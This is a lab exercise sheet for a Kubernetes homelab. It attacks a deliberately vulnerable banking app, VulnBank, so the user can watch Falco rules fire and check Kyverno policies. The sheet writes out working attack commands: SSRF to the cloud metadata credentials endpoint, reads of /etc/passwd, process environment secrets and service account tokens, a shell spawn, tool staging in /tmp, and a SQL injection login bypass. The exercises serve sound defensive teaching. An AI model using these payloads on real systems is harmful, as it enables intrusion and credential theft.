# attack-exercises.md
#
# Phase 2 Attack Cycle — Exploit VulnBank, Observe Falco
#
# For each exercise:
#   1. Run the attack command
#   2. Watch Falco fire in real time
#   3. Understand which rule triggered and why
#   4. Note what Kyverno would have prevented at deploy time
#
# Before starting, open a second terminal and watch Falco logs:
#   kubectl logs -n falco -l app.kubernetes.io/name=falco -f \
#     | grep -E "vuln-bank|postgres|CRITICAL|WARNING|ERROR" \
#     | jq '.'
#
# Get the app URL:
#   export NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[0].address}')
#   export HTTP_PORT=$(kubectl get svc kong-gateway-proxy -n kong \
#     -o jsonpath='{.spec.ports[?(@.name=="kong-proxy")].nodePort}')
#   export BASE=http://${NODE_IP}:${HTTP_PORT}
#
# Register and log in to get a JWT:
#   curl -s -X POST $BASE/api/v1/register \
#     -H "Content-Type: application/json" \
#     -d '{"username":"attacker","password":"Attack123!","email":"a@a.com"}' | jq
#
#   export JWT=$(curl -s -X POST $BASE/api/v1/auth \
#     -H "Content-Type: application/json" \
#     -d '{"username":"attacker","password":"Attack123!"}' | jq -r '.access_token')

---

## Exercise 1 — SSRF (triggers Rule 2: Unexpected Outbound Connection)

# The vuln-bank app fetches a URL you supply and saves it as a profile picture.
# Target the k8s metadata service — blocked by NetworkPolicy but Falco sees the syscall.

curl -s -X POST $BASE/upload_profile_picture_url \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"image_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Expected Falco output:
# {
#   "priority": "WARNING",
#   "rule": "Unexpected Outbound Connection from VulnBank",
#   "output": "WARNING Unexpected outbound connection from vuln-bank ..."
# }
#
# What this demonstrates:
#   - NetworkPolicy dropped the packet (the request fails)
#   - Falco still detected the connect() syscall before the drop
#   - Defence in depth: prevention + detection working together
#
# Try also pointing at your Proxmox host IP or another internal address.

---

## Exercise 2 — Sensitive file read (triggers Rule 3)

# Exec into the running vuln-bank pod and read /etc/passwd directly.
# This simulates what an attacker does after achieving RCE.

kubectl exec -n vuln-bank \
  $(kubectl get pod -n vuln-bank -l app=vuln-bank -o name | head -1) \
  -- cat /etc/passwd

# Expected Falco output:
# {
#   "priority": "ERROR",
#   "rule": "Sensitive File Read in VulnBank Container",
#   "output": "HIGH Sensitive file read in vuln-bank container (file=/etc/passwd ...)"
# }
#
# Try also:
kubectl exec -n vuln-bank \
  $(kubectl get pod -n vuln-bank -l app=vuln-bank -o name | head -1) \
  -- cat /proc/self/environ
# This dumps all environment variables — including DB_PASSWORD.

---

## Exercise 3 — Shell spawn (triggers Rule 1)

# Exec a shell directly. This is what RCE via file upload looks like
# from Falco's perspective.

kubectl exec -n vuln-bank \
  $(kubectl get pod -n vuln-bank -l app=vuln-bank -o name | head -1) \
  -- /bin/sh -c "id && hostname"

# Expected Falco output:
# {
#   "priority": "CRITICAL",
#   "rule": "Shell Spawned in VulnBank Container",
#   "output": "CRITICAL Shell spawned in vuln-bank container (shell=sh ...)"
# }
#
# Notice: because readOnlyRootFilesystem: true is set, the attacker
# cannot write to most paths. But they can still read, exfiltrate data,
# and make outbound connections.

---

## Exercise 4 — Write to writable mount (triggers Rule 4)

# The /tmp and /app/static/uploads dirs are emptyDir — writable.
# An attacker would stage tools here after getting a shell.

kubectl exec -n vuln-bank \
  $(kubectl get pod -n vuln-bank -l app=vuln-bank -o name | head -1) \
  -- /bin/sh -c "echo '#!/bin/sh\nid' > /tmp/tool.sh && chmod +x /tmp/tool.sh"

# Expected Falco output:
# {
#   "priority": "ERROR",
#   "rule": "Executable Written to Writable Mount in VulnBank",
#   "output": "HIGH Executable written to writable mount in vuln-bank ..."
# }

---

## Exercise 5 — Service account token read (triggers Rule 6)

# Check whether the token exists (it should not — automounting is disabled).
# If it does exist for any reason, this catches the read.

kubectl exec -n vuln-bank \
  $(kubectl get pod -n vuln-bank -l app=vuln-bank -o name | head -1) \
  -- cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null \
  || echo "Token not present — automounting correctly disabled"

# If the token IS present (policy was bypassed), Falco fires:
# {
#   "priority": "CRITICAL",
#   "rule": "K8s Service Account Token Read",
#   "output": "CRITICAL Kubernetes service account token read ..."
# }

---

## Exercise 6 — SQL injection (observe Kong + app behaviour)

# VulnBank has SQL injection in the login endpoint.
# This does not trigger Falco (it is a Layer 7 application vuln, not a syscall).
# It demonstrates what Falco cannot see — and why WAF is a Phase 3 concern.

curl -s -X POST $BASE/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}' | jq

# Expected: authentication bypass (returns a JWT for admin)
# Falco: silent — no suspicious syscalls
# Kong: logged as a 200 response (no rule to detect it)
#
# Lesson: Falco is a syscall-level tool. Application-layer attacks that
# don't cause unusual syscalls are invisible to it. This is why RASP
# (Runtime Application Self-Protection) or a WAF is a separate layer.

---

## Kyverno Policy Verification

# Check what Kyverno has audited across all namespaces:
kubectl get policyreport -A

# See detailed violations for vuln-bank namespace:
kubectl get policyreport -n vuln-bank -o yaml | \
  python3 -c "
import sys, yaml
report = yaml.safe_load(sys.stdin)
for result in report.get('results', []):
    if result['result'] == 'fail':
        print(f\"FAIL  {result['policy']} / {result['rule']}\")
        print(f\"      {result['message']}\")
        print()
"

# Switch a policy from Audit to Enforce and try to deploy a bad pod:
# Edit 01-deny-root-pods.yaml: validationFailureAction: Enforce
kubectl apply -f policies/01-deny-root-pods.yaml

# Now try to create a pod running as root — Kyverno should block it:
kubectl run test-root --image=alpine --namespace=vuln-bank \
  --overrides='{"spec":{"securityContext":{"runAsUser":0}}}' \
  -- sleep 3600
# Expected: Error from server: admission webhook denied the request
